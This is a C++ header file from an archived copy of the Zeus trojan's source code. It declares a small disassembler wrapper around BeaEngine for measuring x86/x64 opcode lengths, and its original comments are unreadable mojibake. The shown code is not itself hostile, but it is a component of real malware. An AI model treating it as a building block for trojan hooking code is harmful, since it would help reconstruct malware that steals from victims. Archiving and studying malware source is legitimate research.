/*
  name      Zeus
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    RamadhanAmizudin/malware
  archived  RamadhanAmizudin, krisyotam (2026)
  notes     —
 */
/*
  ������������ �� ������ BeaEngine.
  http://beatrix2004.free.fr/BeaEngine /

  ����������: ������ ������� ����������, ������ ��� �������������� ��� ��������������� ��� x32,
              x64.
*/
#pragma once

namespace Disasm
{
  /*
    �������������.
  */
  void init(void);

  /*
    ���������������.
  */
  void uninit(void);

  /*    Getting the length of the opcode.

    IN pAddress - opcode address.

    Return - the length of the opcode, or ((DWORD) -1) in case of error.
  */
  DWORD _getOpcodeLength(void *pAddress);
};